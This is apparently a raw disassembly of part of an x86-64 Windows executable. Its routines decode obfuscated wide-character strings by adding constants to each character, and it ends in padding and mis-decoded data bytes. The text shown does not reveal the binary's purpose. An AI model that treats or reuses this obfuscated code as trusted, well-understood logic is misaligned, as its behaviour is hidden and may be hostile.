   140005216:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   14000521a:	48 39 c1             	cmp    %rax,%rcx
   14000521d:	75 e5                	jne    0x140005204
   14000521f:	c6 05 00 67 57 00 00 	movb   $0x0,0x576700(%rip)        # 0x14057b926
   140005226:	48 b8 6f 00 78 00 8b 	movabs $0x83008b0078006f,%rax
   14000522d:	00 83 00 
   140005230:	80 3d 69 66 57 00 00 	cmpb   $0x0,0x576669(%rip)        # 0x14057b8a0
   140005237:	c7 84 24 cc 17 00 00 	movl   $0x130078,0x17cc(%rsp)
   14000523e:	78 00 13 00 
   140005242:	48 89 84 24 b4 17 00 	mov    %rax,0x17b4(%rsp)
   140005249:	00 
   14000524a:	48 b8 7f 00 82 00 85 	movabs $0x7800850082007f,%rax
   140005251:	00 78 00 
   140005254:	48 89 84 24 bc 17 00 	mov    %rax,0x17bc(%rsp)
   14000525b:	00 
   14000525c:	48 b8 85 00 41 00 78 	movabs $0x8b007800410085,%rax
   140005263:	00 8b 00 
   140005266:	48 89 84 24 c4 17 00 	mov    %rax,0x17c4(%rsp)
   14000526d:	00 
   14000526e:	75 38                	jne    0x1400052a8
   140005270:	0f 10 a4 24 b4 17 00 	movups 0x17b4(%rsp),%xmm4
   140005277:	00 
   140005278:	0f 10 ac 24 c0 17 00 	movups 0x17c0(%rsp),%xmm5
   14000527f:	00 
   140005280:	48 8d 0d dc c0 ff ff 	lea    -0x3f24(%rip),%rcx        # 0x140001363
   140005287:	c6 05 3e 66 57 00 01 	movb   $0x1,0x57663e(%rip)        # 0x14057b8cc
   14000528e:	c6 05 0b 66 57 00 01 	movb   $0x1,0x57660b(%rip)        # 0x14057b8a0
   140005295:	0f 29 25 14 66 57 00 	movaps %xmm4,0x576614(%rip)        # 0x14057b8b0
   14000529c:	0f 11 2d 19 66 57 00 	movups %xmm5,0x576619(%rip)        # 0x14057b8bc
   1400052a3:	e8 8d c0 ff ff       	call   0x140001335
   1400052a8:	80 3d 1d 66 57 00 00 	cmpb   $0x0,0x57661d(%rip)        # 0x14057b8cc
   1400052af:	4c 8d 35 fa 65 57 00 	lea    0x5765fa(%rip),%r14        # 0x14057b8b0
   1400052b6:	74 29                	je     0x1400052e1
   1400052b8:	4c 89 f0             	mov    %r14,%rax
   1400052bb:	49 8d 4e 1c          	lea    0x1c(%r14),%rcx
   1400052bf:	66 8b 38             	mov    (%rax),%di
   1400052c2:	48 83 c0 02          	add    $0x2,%rax
   1400052c6:	8d 97 ed 57 00 00    	lea    0x57ed(%rdi),%edx
   1400052cc:	66 81 e2 ff 00       	and    $0xff,%dx
   1400052d1:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   1400052d5:	48 39 c1             	cmp    %rax,%rcx
   1400052d8:	75 e5                	jne    0x1400052bf
   1400052da:	c6 05 eb 65 57 00 00 	movb   $0x0,0x5765eb(%rip)        # 0x14057b8cc
   1400052e1:	80 3d a0 5d 57 00 00 	cmpb   $0x0,0x575da0(%rip)        # 0x14057b088
   1400052e8:	48 8d 35 f1 23 57 00 	lea    0x5723f1(%rip),%rsi        # 0x1405776e0
   1400052ef:	b9 ff 01 00 00       	mov    $0x1ff,%ecx
   1400052f4:	48 89 df             	mov    %rbx,%rdi
   1400052f7:	f3 a5                	rep movsl (%rsi),(%rdi)
   1400052f9:	4c 8d 25 a0 5d 57 00 	lea    0x575da0(%rip),%r12        # 0x14057b0a0
   140005300:	75 27                	jne    0x140005329
   140005302:	b9 ff 01 00 00       	mov    $0x1ff,%ecx
   140005307:	4c 89 e7             	mov    %r12,%rdi
   14000530a:	48 89 de             	mov    %rbx,%rsi
   14000530d:	c6 05 88 65 57 00 01 	movb   $0x1,0x576588(%rip)        # 0x14057b89c
   140005314:	f3 a5                	rep movsl (%rsi),(%rdi)
   140005316:	48 8d 0d 45 c0 ff ff 	lea    -0x3fbb(%rip),%rcx        # 0x140001362
   14000531d:	c6 05 64 5d 57 00 01 	movb   $0x1,0x575d64(%rip)        # 0x14057b088
   140005324:	e8 0c c0 ff ff       	call   0x140001335
   140005329:	80 3d 6c 65 57 00 00 	cmpb   $0x0,0x57656c(%rip)        # 0x14057b89c
   140005330:	74 30                	je     0x140005362
   140005332:	48 8d 05 67 5d 57 00 	lea    0x575d67(%rip),%rax        # 0x14057b0a0
   140005339:	48 8d 88 fc 07 00 00 	lea    0x7fc(%rax),%rcx
   140005340:	66 8b 30             	mov    (%rax),%si
   140005343:	48 83 c0 02          	add    $0x2,%rax
   140005347:	8d 96 ed 57 00 00    	lea    0x57ed(%rsi),%edx
   14000534d:	66 81 e2 ff 00       	and    $0xff,%dx
   140005352:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   140005356:	48 39 c1             	cmp    %rax,%rcx
   140005359:	75 e5                	jne    0x140005340
   14000535b:	c6 05 3a 65 57 00 00 	movb   $0x0,0x57653a(%rip)        # 0x14057b89c
   140005362:	80 3d 07 5d 57 00 00 	cmpb   $0x0,0x575d07(%rip)        # 0x14057b070
   140005369:	75 2b                	jne    0x140005396
   14000536b:	48 8d 0d ef bf ff ff 	lea    -0x4011(%rip),%rcx        # 0x140001361
   140005372:	c6 05 07 5d 57 00 01 	movb   $0x1,0x575d07(%rip)        # 0x14057b080
   140005379:	48 b8 b8 00 c7 00 bb 	movabs $0x5300bb00c700b8,%rax
   140005380:	00 53 00 
   140005383:	48 89 05 ee 5c 57 00 	mov    %rax,0x575cee(%rip)        # 0x14057b078
   14000538a:	c6 05 df 5c 57 00 01 	movb   $0x1,0x575cdf(%rip)        # 0x14057b070
   140005391:	e8 9f bf ff ff       	call   0x140001335
   140005396:	80 3d e3 5c 57 00 00 	cmpb   $0x0,0x575ce3(%rip)        # 0x14057b080
   14000539d:	48 8d 0d d4 5c 57 00 	lea    0x575cd4(%rip),%rcx        # 0x14057b078
   1400053a4:	74 29                	je     0x1400053cf
   1400053a6:	48 89 c8             	mov    %rcx,%rax
   1400053a9:	4c 8d 41 08          	lea    0x8(%rcx),%r8
   1400053ad:	66 8b 38             	mov    (%rax),%di
   1400053b0:	48 83 c0 02          	add    $0x2,%rax
   1400053b4:	8d 97 ad 35 00 00    	lea    0x35ad(%rdi),%edx
   1400053ba:	66 81 e2 ff 00       	and    $0xff,%dx
   1400053bf:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   1400053c3:	49 39 c0             	cmp    %rax,%r8
   1400053c6:	75 e5                	jne    0x1400053ad
   1400053c8:	c6 05 b1 5c 57 00 00 	movb   $0x0,0x575cb1(%rip)        # 0x14057b080
   1400053cf:	4c 89 fa             	mov    %r15,%rdx
   1400053d2:	e8 a9 eb ff ff       	call   0x140003f80
   1400053d7:	89 c6                	mov    %eax,%esi
   1400053d9:	85 c0                	test   %eax,%eax
   1400053db:	75 09                	jne    0x1400053e6
   1400053dd:	45 84 ed             	test   %r13b,%r13b
   1400053e0:	0f 84 43 01 00 00    	je     0x140005529
   1400053e6:	31 c0                	xor    %eax,%eax
   1400053e8:	b9 82 00 00 00       	mov    $0x82,%ecx
   1400053ed:	48 89 df             	mov    %rbx,%rdi
   1400053f0:	80 3d 51 5c 57 00 00 	cmpb   $0x0,0x575c51(%rip)        # 0x14057b048
   1400053f7:	f3 ab                	rep stos %eax,(%rdi)
   1400053f9:	48 b8 0d 00 16 00 29 	movabs $0x2100290016000d,%rax
   140005400:	00 21 00 
   140005403:	c7 84 24 e8 00 00 00 	movl   $0xb10016,0xe8(%rsp)
   14000540a:	16 00 b1 00 
   14000540e:	48 89 84 24 d0 00 00 	mov    %rax,0xd0(%rsp)
   140005415:	00 
   140005416:	48 b8 1d 00 20 00 23 	movabs $0x1600230020001d,%rax
   14000541d:	00 16 00 
   140005420:	48 89 84 24 d8 00 00 	mov    %rax,0xd8(%rsp)
   140005427:	00 
   140005428:	48 b8 23 00 df 00 16 	movabs $0x29001600df0023,%rax
   14000542f:	00 29 00 
   140005432:	48 89 84 24 e0 00 00 	mov    %rax,0xe0(%rsp)
   140005439:	00 
   14000543a:	75 38                	jne    0x140005474
   14000543c:	0f 28 84 24 d0 00 00 	movaps 0xd0(%rsp),%xmm0
   140005443:	00 
   140005444:	0f 10 8c 24 dc 00 00 	movups 0xdc(%rsp),%xmm1
   14000544b:	00 
   14000544c:	48 8d 0d 0d bf ff ff 	lea    -0x40f3(%rip),%rcx        # 0x140001360
   140005453:	c6 05 12 5c 57 00 01 	movb   $0x1,0x575c12(%rip)        # 0x14057b06c
   14000545a:	c6 05 e7 5b 57 00 01 	movb   $0x1,0x575be7(%rip)        # 0x14057b048
   140005461:	0f 29 05 e8 5b 57 00 	movaps %xmm0,0x575be8(%rip)        # 0x14057b050
   140005468:	0f 11 0d ed 5b 57 00 	movups %xmm1,0x575bed(%rip)        # 0x14057b05c
   14000546f:	e8 c1 be ff ff       	call   0x140001335
   140005474:	80 3d f1 5b 57 00 00 	cmpb   $0x0,0x575bf1(%rip)        # 0x14057b06c
   14000547b:	48 8d 0d ce 5b 57 00 	lea    0x575bce(%rip),%rcx        # 0x14057b050
   140005482:	74 29                	je     0x1400054ad
   140005484:	48 89 c8             	mov    %rcx,%rax
   140005487:	4c 8d 41 1c          	lea    0x1c(%rcx),%r8
   14000548b:	66 8b 38             	mov    (%rax),%di
   14000548e:	48 83 c0 02          	add    $0x2,%rax
   140005492:	8d 97 4f cf ff ff    	lea    -0x30b1(%rdi),%edx
   140005498:	66 81 e2 ff 00       	and    $0xff,%dx
   14000549d:	66 89 50 fe          	mov    %dx,-0x2(%rax)
   1400054a1:	4c 39 c0             	cmp    %r8,%rax
   1400054a4:	75 e5                	jne    0x14000548b
   1400054a6:	c6 05 bf 5b 57 00 00 	movb   $0x0,0x575bbf(%rip)        # 0x14057b06c
   1400054ad:	4c 89 f2             	mov    %r14,%rdx
   1400054b0:	48 8d bc 24 64 03 00 	lea    0x364(%rsp),%rdi
   1400054b7:	00 
   1400054b8:	e8 c3 ea ff ff       	call   0x140003f80
   1400054bd:	48 8d 94 24 5c 01 00 	lea    0x15c(%rsp),%rdx
   1400054c4:	00 
   1400054c5:	85 c0                	test   %eax,%eax
   1400054c7:	74 03                	je     0x1400054cc
   1400054c9:	48 89 fa             	mov    %rdi,%rdx
   1400054cc:	4c 8d 05 dd 63 57 00 	lea    0x5763dd(%rip),%r8        # 0x14057b8b0
   1400054d3:	48 89 d9             	mov    %rbx,%rcx
   1400054d6:	e8 fa c6 ff ff       	call   0x140001bd5
   1400054db:	85 f6                	test   %esi,%esi
   1400054dd:	75 10                	jne    0x1400054ef
   1400054df:	4c 63 0d 5e 5b 57 00 	movslq 0x575b5e(%rip),%r9        # 0x14057b044
   1400054e6:	4c 8d 05 53 5b 57 00 	lea    0x575b53(%rip),%r8        # 0x14057b040
   1400054ed:	eb 0e                	jmp    0x1400054fd
   1400054ef:	4c 63 0d 0a 04 57 00 	movslq 0x57040a(%rip),%r9        # 0x140575900
   1400054f6:	4c 8d 05 03 c8 00 00 	lea    0xc803(%rip),%r8        # 0x140011d00
   1400054fd:	4c 89 64 24 38       	mov    %r12,0x38(%rsp)
   140005502:	48 8d 8c 24 8c 0d 00 	lea    0xd8c(%rsp),%rcx
   140005509:	00 
   14000550a:	48 89 ea             	mov    %rbp,%rdx
   14000550d:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   140005514:	00 
   140005515:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   14000551a:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000551f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140005524:	e8 53 be ff ff       	call   0x14000137c
   140005529:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140005530:	00 
   140005531:	e8 66 db ff ff       	call   0x14000309c
   140005536:	31 c0                	xor    %eax,%eax
   140005538:	48 81 c4 b8 1f 00 00 	add    $0x1fb8,%rsp
   14000553f:	5b                   	pop    %rbx
   140005540:	5e                   	pop    %rsi
   140005541:	5f                   	pop    %rdi
   140005542:	5d                   	pop    %rbp
   140005543:	41 5c                	pop    %r12
   140005545:	41 5d                	pop    %r13
   140005547:	41 5e                	pop    %r14
   140005549:	41 5f                	pop    %r15
   14000554b:	c3                   	ret
   14000554c:	90                   	nop
   14000554d:	90                   	nop
   14000554e:	90                   	nop
   14000554f:	90                   	nop
   140005550:	e9 fb bd ff ff       	jmp    0x140001350
   140005555:	90                   	nop
   140005556:	90                   	nop
   140005557:	90                   	nop
   140005558:	90                   	nop
   140005559:	90                   	nop
   14000555a:	90                   	nop
   14000555b:	90                   	nop
   14000555c:	90                   	nop
   14000555d:	90                   	nop
   14000555e:	90                   	nop
   14000555f:	90                   	nop
   140005560:	ff                   	(bad)
   140005561:	ff                   	(bad)
   140005562:	ff                   	(bad)
   140005563:	ff                   	(bad)
   140005564:	ff                   	(bad)
   140005565:	ff                   	(bad)
   140005566:	ff                   	(bad)
   140005567:	ff 50 55             	call   *0x55(%rax)
   14000556a:	00 40 01             	add    %al,0x1(%rax)
	...
   140005575:	00 00                	add    %al,(%rax)
   140005577:	00 ff                	add    %bh,%bh
   140005579:	ff                   	(bad)
   14000557a:	ff                   	(bad)
   14000557b:	ff                   	(bad)
   14000557c:	ff                   	(bad)
   14000557d:	ff                   	(bad)
   14000557e:	ff                   	(bad)
   14000557f:	ff 00                	incl   (%rax)
   140005581:	00 00                	add    %al,(%rax)
   140005583:	00 00                	add    %al,(%rax)
   140005585:	00 00                	add    %al,(%rax)
	...
